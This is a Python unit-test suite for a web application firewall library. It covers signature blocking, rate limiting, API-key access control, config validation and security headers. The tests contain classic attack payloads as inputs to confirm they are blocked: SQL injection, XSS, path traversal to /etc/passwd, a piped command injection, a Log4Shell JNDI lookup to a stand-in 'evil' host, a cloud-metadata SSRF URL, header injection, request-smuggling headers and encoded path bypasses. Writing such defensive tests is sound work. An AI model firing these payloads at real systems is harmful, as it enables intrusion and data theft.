import hashlib
import unittest

from ogx.runtime.access import hash_key
from ogx.runtime.config import from_mapping
from ogx.runtime.engine import Shield
from ogx.runtime.ratelimit import RateLimiter
from ogx.runtime.request import Request, normalize_path


def shield(**overrides):
    cfg = {"firewall": {}, "ratelimit": {"enabled": False}, "access": {}}
    for table, values in overrides.items():
        cfg.setdefault(table, {}).update(values)
    events = []
    return Shield(from_mapping(cfg), sink=lambda d, r: events.append(d)), events


def req(path="/", query="", method="GET", headers=None, body=b"", ip="203.0.113.9", **kw):
    return Request(method, path, query, headers or [("Host", "app.test")], body, ip, **kw)


class EngineSignatureTests(unittest.TestCase):
    def test_attacks_are_blocked_with_403(self):
        s, _ = shield()
        attacks = [
            req("/p", "id=1+UNION+SELECT+username,password+FROM+users"),
            req("/s", "q=<script>alert(1)</script>"),
            req("/dl", "file=../../etc/passwd"),
            req("/a/%2e%2e/%2e%2e/etc/passwd"),
            req("/.env"),
            req("/ping", "host=1.1.1.1|cat+/etc/passwd"),
            req("/", headers=[("Host", "x"), ("User-Agent", "${jndi:ldap://evil/a}")]),
            req("/api", method="POST", headers=[("Host", "x"), ("Content-Type", "application/json")], body=b'{"u":"a\' or 1=1 -- "}'),
        ]
        for attack in attacks:
            decision = s.inspect(attack)
            self.assertEqual((decision.action, decision.status), ("block", 403), attack.path + "?" + attack.query)
            self.assertTrue(decision.rule_id.startswith("OGX-RT-"))

    def test_benign_traffic_is_allowed(self):
        s, _ = shield()
        benign = [
            req("/search", "q=blue+shoes&page=2"),
            req("/s", "q=wait...%2Fwhat"),
            req("/s", "q=javascript:+the+good+parts"),
            req("/api", "fields=name|id|email"),
            req("/signup", "email=tom%40example.com&name=O%27Brien"),
            req("/s", "q=labor+union+select+committee"),
            req("/.well-known/security.txt"),
            req("/api/theme", method="POST", headers=[("Host", "x"), ("Content-Type", "application/json")], body=b'{"color":"#fff"}'),
            req("/login", method="POST", headers=[("Host", "x"), ("Content-Type", "application/x-www-form-urlencoded")],
                body=b"user=alice&password=correct+horse+battery"),
        ]
        for ok in benign:
            self.assertTrue(s.inspect(ok).allowed, ok.path + "?" + ok.query)

    def test_monitor_mode_never_blocks_but_records(self):
        s, events = shield(firewall={"mode": "monitor"})
        decision = s.inspect(req("/s", "q=<script>alert(1)</script>"))
        self.assertTrue(decision.allowed)
        self.assertEqual(decision.matches[0].rule_id, "OGX-RT-1020")
        self.assertEqual(len(events), 1)

    def test_strict_profile_blocks_ssrf_and_body_xss_balanced_only_logs(self):
        balanced, _ = shield()
        strict, _ = shield(firewall={"signature_profile": "strict"})
        ssrf = req("/fetch", "url=http://169.254.169.254/latest/meta-data/")
        self.assertTrue(balanced.inspect(ssrf).allowed)
        self.assertEqual(balanced.inspect(ssrf).matches[0].action, "log")
        self.assertEqual(strict.inspect(ssrf).status, 403)
        html_body = req("/cms", method="POST", headers=[("Host", "x"), ("Content-Type", "application/json")],
                        body=b'{"html":"<script>x()</script>"}')
        self.assertTrue(balanced.inspect(html_body).allowed)
        self.assertEqual(strict.inspect(html_body).status, 403)

    def test_disabled_rules_and_skip_paths(self):
        s, _ = shield(firewall={"disabled_rules": ["OGX-RT-1020"], "skip_signature_paths": ["/cms/editor"]})
        self.assertTrue(s.inspect(req("/s", "q=<script>x</script>")).allowed)
        s2, _ = shield(firewall={"skip_signature_paths": ["/cms/editor"]})
        self.assertTrue(s2.inspect(req("/cms/editor/save", "q=<script>x</script>")).allowed)
        self.assertEqual(s2.inspect(req("/other", "q=<script>x</script>")).status, 403)

    def test_signature_profile_off(self):
        s, _ = shield(firewall={"signature_profile": "off"})
        self.assertTrue(s.inspect(req("/s", "q=<script>x</script>")).allowed)


class EngineHygieneTests(unittest.TestCase):
    def test_method_allowlist_returns_405_with_allow_header(self):
        s, _ = shield()
        decision = s.inspect(req(method="TRACE"))
        self.assertEqual(decision.status, 405)
        self.assertTrue(any(k == "Allow" for k, _ in decision.headers))

    def test_size_limits(self):
        s, _ = shield(firewall={"max_url_length": 100, "max_body_bytes": 10, "max_header_count": 5})
        self.assertEqual(s.inspect(req("/x", "a=" + "b" * 200)).status, 414)
        self.assertEqual(s.inspect(req(method="POST", body=b"x" * 11)).status, 413)
        self.assertEqual(s.inspect(req(method="POST", declared_length=999)).status, 413)
        many = [("Host", "x")] + [(f"X-{i}", "v") for i in range(10)]
        self.assertEqual(s.inspect(req(headers=many)).status, 431)

    def test_request_smuggling_shapes(self):
        s, _ = shield()
        both = req(method="POST", headers=[("Host", "x"), ("Content-Length", "5"), ("Transfer-Encoding", "chunked")])
        self.assertEqual(s.inspect(both).status, 400)
        conflicting = req(method="POST", headers=[("Host", "x"), ("Content-Length", "5"), ("Content-Length", "6")])
        self.assertEqual(s.inspect(conflicting).status, 400)
        junk = req(method="POST", headers=[("Host", "x"), ("Content-Length", "5, 6")])
        self.assertEqual(s.inspect(junk).status, 400)

    def test_control_characters_and_null_bytes(self):
        s, _ = shield()
        self.assertEqual(s.inspect(req("/a%00b")).status, 400)
        self.assertEqual(s.inspect(req("/a\x00b")).status, 400)
        self.assertEqual(s.inspect(req(headers=[("Host", "x"), ("X-Evil", "a\r\nSet-Cookie: x=1")])).status, 400)

    def test_host_allowlist(self):
        s, _ = shield(firewall={"allowed_hosts": ["app.test"]})
        self.assertTrue(s.inspect(req(headers=[("Host", "app.test:8080")])).allowed)
        self.assertEqual(s.inspect(req(headers=[("Host", "evil.test")])).status, 400)

    def test_malformed_percent_is_log_only_unless_strict(self):
        balanced, _ = shield()
        strict, _ = shield(firewall={"signature_profile": "strict"})
        self.assertTrue(balanced.inspect(req("/a", "discount=50%")).allowed)
        self.assertEqual(strict.inspect(req("/a", "discount=50%")).status, 400)

    def test_request_id_is_kept_when_valid_and_replaced_when_not(self):
        s, _ = shield()
        self.assertEqual(s.inspect(req(headers=[("Host", "x"), ("X-Request-ID", "abc12345-ok")])).request_id, "abc12345-ok")
        replaced = s.inspect(req(headers=[("Host", "x"), ("X-Request-ID", "bad id\x01")])).request_id
        self.assertRegex(replaced, r"^[0-9a-f]{16}$")


class ClientPolicyTests(unittest.TestCase):
    def test_ip_block_and_allow_lists(self):
        s, _ = shield(firewall={"block_ips": ["203.0.113.0/24"]})
        self.assertEqual(s.inspect(req(ip="203.0.113.9")).status, 403)
        self.assertTrue(s.inspect(req(ip="198.51.100.1")).allowed)
        only, _ = shield(firewall={"allow_ips": ["10.0.0.0/8"]})
        self.assertTrue(only.inspect(req(ip="10.2.3.4")).allowed)
        self.assertEqual(only.inspect(req(ip="8.8.8.8")).status, 403)

    def test_scanner_user_agents(self):
        s, _ = shield()
        self.assertEqual(s.inspect(req(headers=[("Host", "x"), ("User-Agent", "sqlmap/1.7")])).status, 403)

    def test_forwarded_for_is_trusted_only_from_trusted_proxies(self):
        s, _ = shield(firewall={"trusted_proxies": ["10.0.0.0/8"]})
        via_proxy = req(ip="10.0.0.5", headers=[("Host", "x"), ("X-Forwarded-For", "1.2.3.4, 10.0.0.7")])
        self.assertEqual(s.client_ip(via_proxy), "1.2.3.4")
        spoof = req(ip="198.51.100.7", headers=[("Host", "x"), ("X-Forwarded-For", "1.2.3.4")])
        self.assertEqual(s.client_ip(spoof), "198.51.100.7")          # untrusted peer: header ignored
        garbage = req(ip="10.0.0.5", headers=[("Host", "x"), ("X-Forwarded-For", "not-an-ip")])
        self.assertEqual(s.client_ip(garbage), "10.0.0.5")
        no_trust, _ = shield()
        self.assertEqual(no_trust.client_ip(via_proxy), "10.0.0.5")


class RateLimitTests(unittest.TestCase):
    def test_token_bucket_burst_then_throttle_then_refill(self):
        now = [0.0]
        limiter = RateLimiter(clock=lambda: now[0])
        results = [limiter.allow("ip", 60, 3)[0] for _ in range(5)]
        self.assertEqual(results, [True, True, True, False, False])
        allowed, retry = limiter.allow("ip", 60, 3)
        self.assertFalse(allowed)
        self.assertGreaterEqual(retry, 1)
        now[0] += 2.0                                   # 60 rpm = 1 token/second
        self.assertTrue(limiter.allow("ip", 60, 3)[0])
        self.assertTrue(limiter.allow("ip", 60, 3)[0])
        self.assertFalse(limiter.allow("ip", 60, 3)[0])

    def test_bounded_memory(self):
        limiter = RateLimiter(max_clients=100)
        for i in range(500):
            limiter.allow(f"ip{i}", 60, 5)
        self.assertLessEqual(len(limiter), 100)

    def test_engine_returns_429_with_retry_after_and_per_route_limits(self):
        now = [0.0]
        cfg = from_mapping({"ratelimit": {"requests_per_minute": 600, "burst": 100,
                                          "routes": [{"prefix": "/login", "requests_per_minute": 6, "burst": 2}]}})
        s = Shield(cfg, clock=lambda: now[0], sink=lambda d, r: None)
        self.assertTrue(s.inspect(req("/login")).allowed)
        self.assertTrue(s.inspect(req("/login")).allowed)
        third = s.inspect(req("/login"))
        self.assertEqual(third.status, 429)
        self.assertTrue(any(k == "Retry-After" and int(v) >= 1 for k, v in third.headers))
        self.assertTrue(s.inspect(req("/home")).allowed)           # other routes unaffected
        self.assertTrue(s.inspect(req("/login", ip="198.51.100.2")).allowed)   # other clients unaffected

    def test_monitor_mode_counts_but_does_not_throttle(self):
        cfg = from_mapping({"firewall": {"mode": "monitor"}, "ratelimit": {"requests_per_minute": 1, "burst": 1}})
        s = Shield(cfg, sink=lambda d, r: None)
        statuses = [s.inspect(req()).status for _ in range(5)]
        self.assertEqual(set(statuses), {200})


class AccessControlTests(unittest.TestCase):
    KEY_ADMIN, KEY_USER = "admin-key-" + "a" * 24, "user-key-" + "b" * 24

    def _shield(self):
        return shield(access={
            "enabled": True,
            "keys": [{"name": "root", "role": "admin", "sha256": hash_key(self.KEY_ADMIN)},
                     {"name": "bob", "role": "user", "sha256": hash_key(self.KEY_USER)}],
            "rules": [{"prefix": "/admin", "require": "api_key", "roles": ["admin"]},
                      {"prefix": "/api", "require": "api_key"},
                      {"prefix": "/internal", "require": "none", "ip_allow": ["10.0.0.0/8"]}],
        })[0]

    def test_missing_wrong_and_valid_keys(self):
        s = self._shield()
        missing = s.inspect(req("/api/items"))
        self.assertEqual(missing.status, 401)
        self.assertTrue(any(k == "WWW-Authenticate" for k, _ in missing.headers))
        self.assertEqual(s.inspect(req("/api/items", headers=[("Host", "x"), ("X-API-Key", "nope")])).status, 401)
        self.assertTrue(s.inspect(req("/api/items", headers=[("Host", "x"), ("X-API-Key", self.KEY_USER)])).allowed)
        bearer = [("Host", "x"), ("Authorization", f"Bearer {self.KEY_USER}")]
        self.assertTrue(s.inspect(req("/api/items", headers=bearer)).allowed)

    def test_roles(self):
        s = self._shield()
        user = [("Host", "x"), ("X-API-Key", self.KEY_USER)]
        admin = [("Host", "x"), ("X-API-Key", self.KEY_ADMIN)]
        self.assertEqual(s.inspect(req("/admin/users", headers=user)).status, 403)
        self.assertTrue(s.inspect(req("/admin/users", headers=admin)).allowed)

    def test_route_ip_allow_list(self):
        s = self._shield()
        self.assertTrue(s.inspect(req("/internal/metrics", ip="10.1.1.1")).allowed)
        self.assertEqual(s.inspect(req("/internal/metrics", ip="8.8.8.8")).status, 403)

    def test_path_tricks_cannot_bypass_rules(self):
        s = self._shield()
        for sneaky in ("/ADMIN/users", "/public/../admin/users", "//admin//users", "/%61dmin/users", "/admin/./users", "/%2561dmin/users"):
            decision = s.inspect(req(sneaky))
            self.assertFalse(decision.allowed, sneaky)
        self.assertEqual(normalize_path("/public/../admin/x"), "/admin/x")

    def test_unprotected_routes_pass(self):
        self.assertTrue(self._shield().inspect(req("/")).allowed)


class ConfigTests(unittest.TestCase):
    def test_defaults_are_secure_and_valid(self):
        cfg = from_mapping({})
        self.assertEqual((cfg.mode, cfg.signature_profile, cfg.security_headers, cfg.expose_rule_id), ("enforce", "balanced", True, False))
        self.assertNotIn("TRACE", cfg.allowed_methods)

    def test_validation_errors(self):
        bad = [{"firewall": {"mode": "yolo"}}, {"firewall": {"max_body_bytes": "big"}}, {"firewall": {"block_ips": ["nope"]}},
               {"access": {"keys": [{"name": "x", "sha256": "plaintext-key"}]}}, {"ratelimit": {"routes": [{"prefix": "no-slash"}]}},
               {"firewall": {"allowed_methods": ["get;drop"]}}]
        for data in bad:
            with self.assertRaises(ValueError, msg=str(data)):
                from_mapping(data)

    def test_plaintext_keys_are_never_accepted_and_env_keys_work(self):
        import os
        digest = hashlib.sha256(b"k").hexdigest()
        os.environ["OMEGA_GUARD_KEYS"] = f"svc:admin:{digest}"
        try:
            cfg = from_mapping({})
            self.assertEqual([(k.name, k.role) for k in cfg.api_keys], [("svc", "admin")])
            os.environ["OMEGA_GUARD_KEYS"] = "svc:admin:not-a-hash"
            with self.assertRaises(ValueError):
                from_mapping({})
        finally:
            os.environ.pop("OMEGA_GUARD_KEYS", None)

    def test_warnings_mention_risky_settings(self):
        text = " ".join(from_mapping({"firewall": {"mode": "monitor"}, "access": {"enabled": True}}).warnings())
        self.assertIn("monitor", text)
        self.assertIn("no API keys", text)


class ResponseTests(unittest.TestCase):
    def test_block_response_hides_rule_ids_by_default(self):
        s, _ = shield()
        decision = s.inspect(req("/s", "q=<script>x</script>"))
        status, headers, body = s.block_response(decision)
        self.assertEqual(status, 403)
        self.assertNotIn(b"OGX-RT", body)
        self.assertIn(decision.request_id.encode(), body)
        exposed, _ = shield(firewall={"expose_rule_id": True})
        self.assertIn(b"OGX-RT-1020", exposed.block_response(exposed.inspect(req("/s", "q=<script>x</script>")))[2])

    def test_harden_adds_missing_headers_but_never_overrides(self):
        s, _ = shield()
        out = dict(s.harden([("X-Frame-Options", "DENY")], "https", "rid12345"))
        self.assertEqual(out["X-Frame-Options"], "DENY")
        self.assertEqual(out["X-Content-Type-Options"], "nosniff")
        self.assertIn("Strict-Transport-Security", out)
        self.assertEqual(out["X-Request-ID"], "rid12345")
        plain = dict(s.harden([], "http"))
        self.assertNotIn("Strict-Transport-Security", plain)
        off, _ = shield(firewall={"security_headers": False})
        self.assertEqual(off.harden([], "https"), [])


if __name__ == "__main__":
    unittest.main()
